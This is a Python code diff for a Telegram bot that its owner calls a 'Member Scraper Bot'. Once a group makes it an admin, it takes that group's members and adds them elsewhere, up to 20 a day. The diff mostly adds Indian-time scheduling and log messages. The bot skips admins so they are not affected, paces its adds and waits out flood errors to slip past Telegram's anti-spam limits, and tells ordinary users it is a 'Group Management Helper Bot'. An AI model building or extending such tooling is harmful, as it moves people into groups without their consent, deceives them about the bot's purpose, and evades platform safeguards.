@@ -2,13 +2,14 @@ import os
 import sqlite3
 import asyncio
 from datetime import datetime
+from zoneinfo import ZoneInfo
 from dotenv import load_dotenv
 from telethon import TelegramClient, events
 from telethon.tl.types import ChannelParticipantsAdmins
 from telethon.errors import UserPrivacyRestrictedError, FloodWaitError
 from apscheduler.schedulers.asyncio import AsyncIOScheduler
 
-# Environment variables load karein
+# .env file load karein
 load_dotenv()
 
 API_ID = int(os.getenv("API_ID"))
@@ -35,7 +36,7 @@ conn.commit()
 def get_today_count(group_id):
     cursor.execute("SELECT count FROM daily_limits WHERE group_id = ?", (group_id,))
     row = cursor.fetchone()
-    return row if row else 0
+    return row[0] if row else 0
 
 def update_count(group_id, group_name, new_count):
     cursor.execute("INSERT OR REPLACE INTO daily_limits (group_id, group_name, count) VALUES (?, ?, ?)", (group_id, group_name, new_count))
@@ -44,13 +45,13 @@ def update_count(group_id, group_name, new_count):
 def reset_daily_limits():
     cursor.execute("UPDATE daily_limits SET count = 0")
     conn.commit()
-    print("Daily limits reset successfully!")
+    print("Daily limits reset successfully for Indian Time Zone!")
 
 def get_all_status():
     cursor.execute("SELECT group_name, count, group_id FROM daily_limits")
     return cursor.fetchall()
 
-# MAIN LOGIC: Members Transfer
+# MAIN LOGIC: Members Transfer Function
 async def transfer_members_from_group(source_group_id):
     current_count = get_today_count(source_group_id)
     
@@ -66,10 +67,12 @@ async def transfer_members_from_group(source_group_id):
 
     print(f"[{group_name}] se members nikalna shuru ho raha hai...")
     
+    # Admins/Owner nikalna taaki skip kiya ja sake
     admin_ids = set()
     try:
         async for admin in bot.iter_participants(source_group_id, filter=ChannelParticipantsAdmins):
             admin_ids.add(admin.id)
+        print(f"Total {len(admin_ids)} admins/owner mile. Inhe skip kiya jayega.")
     except Exception as e:
         print(f"Admins list fetch nahi ho payi: {e}. Safe side ke liye transfer cancel.")
         return
@@ -83,7 +86,8 @@ async def transfer_members_from_group(source_group_id):
                 continue
             
             if user.id in admin_ids:
-                continue # Group admins ko skip karein
+                print(f"Skipped Admin/Owner: {user.first_name}")
+                continue # Group admins/owner ko skip karein
             
             if added_in_this_session >= max_to_add:
                 break
@@ -93,12 +97,13 @@ async def transfer_members_from_group(source_group_id):
                 
                 added_in_this_session += 1
                 update_count(source_group_id, group_name, current_count + added_in_this_session)
-                print(f"[{group_name}] Added: {user.first_name}")
+                print(f"[{group_name}] Added: {user.first_name} ({current_count + added_in_this_session}/20)")
                 
+                # Telegram anti-spam ke liye safe delay (20 seconds)
                 await asyncio.sleep(20)
 
             except UserPrivacyRestrictedError:
-                pass 
+                pass # Privacy restricted users ko silently skip karein
             except FloodWaitError as e:
                 print(f"Telegram Limit! {e.seconds} seconds ke liye break.")
                 await asyncio.sleep(e.seconds)
@@ -114,6 +119,7 @@ async def handler(event):
     if event.user_added and event.user_id == (await bot.get_me()).id:
         permissions = await bot.get_permissions(event.chat_id, 'me')
         if permissions.is_admin:
+            print(f"Bot ko naye group ({event.chat_id}) me admin banaya gaya!")
             asyncio.create_task(transfer_members_from_group(event.chat_id))
 
 # COMMAND: /start
@@ -121,17 +127,15 @@ async def handler(event):
 async def start_command(event):
     sender_id = event.sender_id
     
-    # Check karein agar message bhejne wala khud OWNER hai
     if sender_id == OWNER_ID:
         welcome_owner = (
             "👋 **Welcome Back, Boss!** 😎\n\n"
-            "Main aapka Member Scraper Bot hoon. Main bilkul sahi chal raha hoon.\n\n"
+            "Main aapka Member Scraper Bot hoon. Indian Time Zone ke mutabik sab set hai.\n\n"
             "🛠️ **Aapke Commands:**\n"
             "📊 /status - Aaj ki live transfer report dekhne ke liye."
         )
         await event.respond(welcome_owner)
     else:
-        # Baaki normal users ke liye message
         welcome_user = (
             "👋 **Hello!**\n\n"
             "Main ek Group Management Helper Bot hoon. Mujhe use karne ke liye aapke paas owner permissions honi chahiye."
@@ -150,7 +154,7 @@ async def status_command(event):
         await event.respond("📊 **Status Report:**\nAbhi tak kisi bhi group se koi member add nahi kiya gaya hai.")
         return
 
-    report = "📊 **Daily Transfer Status Report:**\n\n"
+    report = "📊 **Daily Transfer Status Report (IST):**\n\n"
     total_added_today = 0
     
     for name, count, gid in rows:
@@ -160,11 +164,12 @@ async def status_command(event):
     report += f"\n📈 **Total Members Added Today:** `{total_added_today}`"
     await event.respond(report)
 
-# SCHEDULER: Raat 12 baje limit reset
-scheduler = AsyncIOScheduler()
+# SCHEDULER: Indian Standard Time (IST) par raat 12:00 baje reset
+indian_tz = ZoneInfo("Asia/Kolkata")
+scheduler = AsyncIOScheduler(timezone=indian_tz)
 scheduler.add_job(reset_daily_limits, 'cron', hour=0, minute=0)
 scheduler.start()
 
-print("Bot Running... /start and /status commands ready.")
+print("Bot safely running under Indian Time Zone... Press Ctrl+C to stop.")
 bot.run_until_disconnected()
-      
+    
